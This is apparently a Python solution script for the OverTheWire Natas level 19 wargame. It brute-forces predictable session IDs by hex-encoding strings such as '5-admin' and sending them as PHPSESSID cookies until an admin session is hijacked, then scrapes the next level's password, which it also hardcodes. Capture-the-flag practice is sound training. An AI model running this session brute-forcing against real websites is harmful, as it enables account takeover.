#!/usr/bin/env python3

import requests, re

url = 'http://natas19.natas.labs.overthewire.org/'
user = 'natas19'
natas19_pw = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

for i in range(0, 641):

    sid = str(i) + '-admin'
    print('sid: ' + sid)
    sid = sid.encode('utf-8').hex()
    print('encoded: ' + sid + '\n')
    r = requests.get(url, auth=(user, natas19_pw), cookies={'PHPSESSID':sid})

   
    if 'You are an admin. The credentials for the next level are:' in r.text:
        match = re.search(r'(Password:.*)(<)', r.text)
        print(match.group(0))
        break